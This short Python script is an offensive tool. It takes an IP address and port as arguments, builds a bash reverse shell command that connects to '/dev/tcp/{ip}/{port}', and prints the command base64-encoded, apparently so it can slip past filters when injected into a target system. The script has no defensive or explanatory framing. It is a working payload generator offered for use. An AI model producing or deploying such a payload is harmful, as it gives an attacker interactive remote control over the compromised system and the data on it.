import sys
import base64

# Check if both IP address and port are provided as command line arguments
if len(sys.argv) != 3:
    print("Usage: python script.py <ip_address> <port>")
    sys.exit(1)

ip_address = sys.argv[1]
port = sys.argv[2]

# Create the Bash shell session command
bash_command = f"bash -i >& /dev/tcp/{ip_address}/{port} 0>&1"

# Encode the command in base64
base64_command = base64.b64encode(bash_command.encode()).decode()

print(f"Base64-encoded Bash shell session command:")
print(base64_command)
